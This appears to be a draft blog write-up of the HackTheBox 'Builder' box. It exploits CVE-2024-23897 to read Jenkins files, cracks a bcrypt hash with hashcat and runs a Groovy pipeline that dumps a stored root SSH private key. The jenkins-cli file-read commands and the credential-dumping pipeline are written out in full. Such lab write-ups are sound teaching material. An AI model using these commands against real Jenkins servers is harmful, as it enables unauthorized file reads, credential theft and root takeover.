+++
date = '2026-04-20T21:43:20-04:00'
draft = true
title = 'Builder'
+++

Builder is a medium-rated Linux box on HackTheBox. The path goes through an exposed Jenkins instance, exploiting CVE-2024-23897 to get arbitrary file reads via the Jenkins CLI, cracking a bcrypt hash pulled from the user config, and then abusing authenticated pipeline execution to dump a stored SSH private key and get root.

---

## Enumeration

**Target:** `10.10.11.10`  
**My IP:** `10.10.14.23`

### NMAP

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
8080/tcp open  http    Jetty 10.0.18
|_http-server-header: Jetty(10.0.18)
|_http-title: Dashboard [Jenkins]
| http-robots.txt: 1 disallowed entry 
|_/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Two ports — SSH and an HTTP service on 8080. The HTTP title immediately gives it away: this is a **Jenkins** dashboard running on **Jetty 10.0.18**.

---

## Port 8080 — Jenkins

Browsed to `http://10.10.11.10:8080/`. Jenkins version **2.441** and poked around the user list. Found a registered user with the user ID `jennifer`.

From there I went looking for known vulns against this version and landed on [CVE-2024-23897](https://www.errno.fr/bruteforcing_CVE-2024-23897.html). This one is a neat arbitrary file read through the Jenkins CLI. The [official security advisory](https://www.jenkins.io/security/advisory/2024-01-24/) and a public [exploit](https://github.com/xaitax/CVE-2024-23897) confirmed it.

---

## Foothold — CVE-2024-23897 (Jenkins Arbitrary File Read)

The vulnerability works because the Jenkins CLI treats `@<filepath>` as an instruction to read the contents of that file when supplied as an argument. The `connect-node` command reads each line from the file independently and then spits them out in the error messages — so even a full multi-line file ends up readable.

First I grabbed the `users.xml` to figure out where jennifer's config lived:

```
java -jar jenkins-cli.jar -noCertificateCheck -s http://10.10.11.10:8080/ connect-node @/var/jenkins_home/users/users.xml
```

That gave back the folder name for her account, so I followed it up with:

```
java -jar jenkins-cli.jar -noCertificateCheck -s http://10.10.11.10:8080/ connect-node @/var/jenkins_home/users/jennifer_12108429903186576833/config.xml
```

Inside `config.xml` there was a bcrypt password hash:

```
<passwordHash>#jbcrypt:$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a</passwordHash>
```

Threw it at hashcat with rockyou and mode 3200 (bcrypt):

```
hashcat '$2a$10$UwR7BpEH.ccfpi1tv6w/XuBtS44S7oUpR2JYiobqxcDQJeN/L4l1a' -m 3200 /usr/share/wordlists/rockyou.txt 
```

Cracked. Logged into the Jenkins dashboard as `jennifer`.

---

## Privilege Escalation — Dumping the Root SSH Key via Pipeline

As jennifer, I had enough permissions to create and run a pipeline job. Jenkins pipelines can access global credentials stored in the instance — including SSH keys. I found a credential stored with id `1` that turned out to be the root SSH private key.

Based on [this write-up on dumping Jenkins credentials](https://www.codurance.com/publications/2019/05/30/accessing-and-dumping-jenkins-credentials), I put together a pipeline that uses `withCredentials` to bind the SSH key to a variable and then reads the key file contents directly:

```
pipeline {
  agent any
  stages {

    stage('sshUserPrivateKey') {
      steps {
        script {
          withCredentials([
            sshUserPrivateKey(
              credentialsId: '1',
              keyFileVariable: 'keyFile',
              passphraseVariable: 'passphrase',
              usernameVariable: 'username')
          ]) {
            print 'keyFile=' + keyFile
            print 'keyFile.collect { it }=' + keyFile.collect { it }
            print 'keyFileContent=' + readFile(keyFile)
          }
        }
      }
    }

  }
}
```

Ran it and the build log printed the full RSA private key. Saved it, `chmod 600`'d it, and SSHed in as root.

### Root

```
# id
uid=0(root) gid=0(root) groups=0(root)
```
